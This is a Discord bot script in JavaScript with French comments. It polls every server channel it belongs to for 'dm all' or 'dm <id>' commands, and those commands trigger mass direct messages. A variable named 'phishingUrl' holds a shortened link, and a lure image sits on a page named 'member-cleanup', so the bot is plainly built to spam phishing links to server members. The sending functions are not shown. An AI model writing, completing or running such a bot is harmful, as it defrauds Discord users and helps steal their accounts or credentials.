const fs = require('fs');
const config = JSON.parse(fs.readFileSync('./config.json'));
const token = config.token;

const phishingUrl = "https://tinyurl.com/6c6b86en";
const imageUrl = "https://swiemali2-lgtm.github.io/member-cleanup/IMG_2560.jpeg";

let processed = new Set();
const startTime = Date.now(); // On note l'heure de démarrage du bot

async function listen() {
  console.log("Bot en ligne. En attente de commandes (dm all / dm ID)...");
  
  setInterval(async () => {
    let res = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {headers: {"Authorization": `Bot ${token}`}});
    let guilds = await res.json();
    if (!Array.isArray(guilds)) return;

    for (let g of guilds) {
      let chansRes = await fetch(`https://discord.com/api/v9/guilds/${g.id}/channels`, {headers: {"Authorization": `Bot ${token}`}});
      let chans = await chansRes.json();
      if (!Array.isArray(chans)) continue;

      for (let c of chans) {
        if (c.type !== 0) continue;
        
        let msgsRes = await fetch(`https://discord.com/api/v9/channels/${c.id}/messages?limit=5`, {headers: {"Authorization": `Bot ${token}`}});
        let msgs = await msgsRes.json();
        if (!Array.isArray(msgs)) continue;
        
        for (let m of msgs) {
          if (!m.content || processed.has(m.id)) continue;
          
          // On ignore les messages envoyés AVANT le démarrage du bot (avec une marge de 10 secondes)
          const msgTime = new Date(m.timestamp).getTime();
          if (msgTime < (startTime - 10000)) {
             processed.add(m.id);
             continue;
          }

          const content = m.content.toLowerCase().trim();
          
          if (content === "dm all") {
            processed.add(m.id);
            console.log("Commande 'dm all' reçue. Lancement...");
            dmAll();
          }
          
          if (content.startsWith("dm ") && content !== "dm all") {
            processed.add(m.id);
            const targetId = content.split(" ")[1];
            console.log("Commande 'dm' reçue pour l'id :", targetId);
            sendDM(targetId);
          }
        }
      }
    }
  }, 5000);
}

// ... (le reste des fonctions sendDM et dmAll reste exactement pareil)